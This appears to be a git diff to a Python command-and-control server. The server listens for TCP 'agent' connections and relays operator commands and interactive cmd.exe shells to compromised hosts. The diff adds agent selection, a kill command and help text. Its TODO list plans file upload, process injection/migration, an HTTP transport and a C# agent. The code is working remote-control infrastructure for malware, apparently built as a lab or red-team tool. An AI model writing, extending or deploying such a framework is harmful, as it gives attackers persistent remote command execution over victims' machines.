@@ -28,10 +28,15 @@ import inspect
 # TODO:
 #   - verification if agent is alive?
 #   - kill agent
+#   - list commands in agent mode!
 #   [DONE] correct exit from shell
 #   [DONE] help messages of Cmd 
+#   - add commands:
+#        getpid
+#        upload file
+#        migrate > inject itself
 #   - add HTTP transport
-#   - use commands (getpid, upload file, exec shellcode) and cmd.exe only if 'shell' entered
+#   - write C# agent
 
 def main():
     terminal = Terminal(Listeners,ClientDict)
@@ -50,21 +55,30 @@ class Terminal(Cmd):
         self.agent = ''
         self.parentagent = ''
         self.prompt = '$ '
+        self.tokill = ''
 
+    def help_interact(self):
+        print("interact <agent_id>")
+        print("To view available agents, use: list agents")
 
     def do_interact(self,args):
-        if len(args.split(' ')) != 1 or args.split(' ')[0] == '':
-            print("[-] No agent specified. Use: 'list agents'")
+        # if only one agent connected - interact with it
+        if len(self.ClientDict) == 1:
+            self.agent = list(self.ClientDict.keys())[0]
+            self.q = self.ClientDict[self.agent][1]
+            self.prompt = '{} $ '.format(self.ClientDict[self.agent][0][0])
+        # else parse if correct agent ID is given
+        elif len(args.split(' ')) != 1 or args.split(' ')[0] == '':
+            print("[-] Incorrect agent ID specified. Use: 'list agents'")
         else:
             self.agent = args
             try:
-                self.q = ClientDict[self.agent][1]
+                self.q = self.ClientDict[self.agent][1]
                 self.prompt = '{} $ '.format(self.ClientDict[self.agent][0][0])
             except KeyError:
                 print("[-] No such agent. Use: 'list agents'")
             except Exception as ex:
                 print("[-] Unhandled exception in do_interact function: {}".format(ex))
-
 
     def do_shell(self,args):
         if self.q == None:
@@ -73,22 +87,25 @@ class Terminal(Cmd):
         else:
             self.q.put("shell\n")
             
-            # For now shell is implemented in separate connection in agents
+            # For now shell is implemented in separate connection
             # Sleep while shell connection is created
-            self.shell = True
-            self.parentagent = self.agent
             time.sleep(1)
- 
-            # Parsing last agent ID from queu
+
+            self.shell = True
+
+            # Parsing last agent ID from queue
+            self.parentagent = self.agent
             self.agent = list(self.ClientDict.keys())[-1]
+            
             # TODO - IMPLEMENT VERIFICATION IF SAME IP? ONLY THEN ASSIGN QUEUE?
             
             self.do_interact(self.agent)
-            self.prompt = '{} shell $ '.format(self.ClientDict[self.agent][0][0])
+            self.shellip = self.ClientDict[self.agent][0][0]
+            self.prompt = '{} shell $ '.format(self.shellip)
             
+            # After Queue is assigned and IP parsed, can
             # remove from ClientDict as not agent, but redundant connection
             del self.ClientDict[self.agent]
-
 
     def do_back(self,args):
         if self.shell == True:
@@ -108,6 +125,36 @@ class Terminal(Cmd):
             time.sleep(0.5)
             os._exit(0)
 
+    def do_kill(self,args):
+        if self.agent != None and args.split(' ')[0] == '':
+            self.tokill = input("Do you want to kill current agent? [y/N] ")
+            if self.tokill.lower() == 'y':
+                self.q = ClientDict[self.agent][1]
+                self.q.put('exit\n')
+                self.q = None
+                self.prompt = '$ '
+            elif self.tokill.lower() == 'n' or self.tokill == '':
+                return
+            else:
+                print("Do no understand your input.. Doing nothing.")
+                return
+        elif len(args.split(' ')) != 1 or args.split(' ')[0] == '':
+            print("[-] Incorrect agent ID specified. Use: 'list agents'")
+        else:
+            self.agent = args
+            try:
+                self.q = ClientDict[self.agent][1]
+                self.q.put('exit\n')
+                self.q = None
+                self.prompt = '$ '
+            except KeyError:
+                print("[-] No such agent. Use: 'list agents'")
+            except Exception as ex:
+                print("[-] Unhandled exception in do_interact function: {}".format(ex))
+
+    def help_kill(self):
+        print("Usage: kill <agent_id>")
+
     def do_start(self,args):
         if len(args.split(' ')) != 2:
             self.help_start()
@@ -125,19 +172,16 @@ class Terminal(Cmd):
                 self.help_start()
 
     def help_start(self):
-        # TODO
         print("start <arguments>")
         print("\tlistener <type>")
-        print("\t\ttcp")
+        print("\nTo get available listeners, use: list listeners")
 
     def do_list(self,args):
-        #print("[DBG] args.split(' '): {}".format(args.split(' ')))
-        #print("[DBG] len(args.split(' ')): {}".format(len(args.split(' '))))
         if len(args.split(' ')) != 1 or args.split(' ')[0] == '':
             self.help_list()
         else:
             if (args.lower() == "agents" or args == "a"):
-                print("Agents:")#.format(ClientDict))
+                print("Agents:")
                 for i in self.ClientDict.keys():
                     print("\tID: {} IP: {}".format(i,ClientDict[i][0][0]))
             elif (args.lower() == "lhost"):
@@ -154,13 +198,10 @@ class Terminal(Cmd):
                 self.help_list()
     
     def help_list(self):
-        # TODO
         print("list <arguments>")
         print("\tagents\n\tlhost\n\tlport\n\tlisteners")
 
     def do_set(self,args):
-        #print("[DBG] args.split(' '): {}".format(args.split(' ')))
-        #print("[DBG] len(args.split(' ')): {}".format(len(args.split(' '))))
         if (len(args.split(' ')) < 2):
             self.help_set()
         else:
@@ -171,21 +212,18 @@ class Terminal(Cmd):
             elif (option.lower() == 'lport'):
                 self.lport = int(value)
         
-
     def help_set(self):
-        # TODO
         print("set <argument> <value>")
         print('\tlport <port>')
         print('\tlhost <IP>')
         print('\t\tExample: set lhost 192.168.56.112')
         
-
     def emptyline(self):
         if self.q == None:
             pass
         else:
             self.q.put("\n")
-            time.sleep(1) # To not input prompt before response
+            time.sleep(1.2) # To not input prompt before response
     
     def default(self, args):
         if self.q == None:
@@ -193,13 +231,8 @@ class Terminal(Cmd):
             self.help_interact()
         else:
             self.q.put(args+"\n")
-        time.sleep(1) # To not input prompt before response
+            time.sleep(1.2) # To not input prompt before response
 
-    def help_interact(self):
-        print("interact <agent_id>")
-        print("To view available agents, use: list agents")
-
-    
 
 
 class listener_tcp(threading.Thread):
@@ -223,13 +256,11 @@ class listener_tcp(threading.Thread):
             # Any agent connection goes in BotHandler threading class.
             newthread = BotHandler(client, client_address, q)
             
-            #print("\n[DBG] Adding new agent to agent list...")
             randName = hashlib.sha1(hex(random.randrange(100000,200000)).split('0x')[1].encode('utf-8')).hexdigest()
             newthread.setName(str(randName))
             newthread.start()
             
             ClientDict[randName] = (client_address, q)
-            #print("[DBG] Added. Agent list now: {}".format(ClientDict))
 
 
 class BotHandler(threading.Thread):
@@ -264,27 +295,22 @@ class BotHandler(threading.Thread):
             else:
                 banner += recv
         if banner:
-            #print("[*] Received banner from {}:\n{}".format(AgentName, banner))
             print(banner)
         time.sleep(0.5)
 
         # Command loop
         while True:
-            #print("[DBG] BotHandler with AgentName {} here 1...".format(AgentName))
             RecvBotCmd = self.q.get()
-            #print("[DBG] BotHandler with AgentName {} here 2...".format(AgentName))
-            print("[DBG] RecvBotCmd is {}".format(RecvBotCmd))
             try:
                 self.client.send(RecvBotCmd.encode('utf-8'))
-                #print("[DBG] BotHandler with AgentName {} here 3...".format(AgentName))
                 cmd_response = ""
                 while True:
-                    #print("[DBG] BotHandler with AgentName {} here 4...".format(AgentName))
                     try:
                         # Separate parsing for long commands...
                         #longcommands = ["ping"]
                         #if any(RecvBotCmd in s for s in longcommands):
                         #    self.client.settimeout(5)
+            
                         # Client returns entered command (because cmd.exe has it in input)
                         # So 
                         # if response is only as large as input - command not completed yet
@@ -295,7 +321,6 @@ class BotHandler(threading.Thread):
                             self.client.settimeout(5)
                         else:
                             self.client.settimeout(1)
-                        #print("[DBG] BotHandler with AgentName {} here 5...".format(AgentName))
                         recv = self.client.recv(4096).decode('utf-8')
                     except socket.timeout:
                         # if timeout exception is triggered - assume no data anymore
@@ -308,20 +333,19 @@ class BotHandler(threading.Thread):
                         break
                     else:
                         cmd_response += recv
-                    #print("[DBG] BotHandler with AgentName {} here 6...".format(AgentName))
                 
                 # Removing sent command from response before printing output
                 print(cmd_response.replace(RecvBotCmd,""))
             
             except Exception as ex:
-                print("[-] Exception occured during command sending: {}".format(ex))
+                print("[-] Exception occured while sending command: {}".format(ex))
                 break
 
 
-ClientDict = {}
-Listeners = []
-
 if __name__ == '__main__':
+    ClientDict = {}
+    Listeners = []
+    # Search for Classes with '*listener*' pattern in name
     members = inspect.getmembers(sys.modules[__name__])
     for i in range(len(members)):
         if 'listener' in members[i][0]:
@@ -329,5 +353,5 @@ if __name__ == '__main__':
     # Should call Listener class as:
     #   new_listener = Listeners[i][1]("192.168.56.112",8008)
     #   new_listener.start()
-    # TODO test ^
+    
     main()
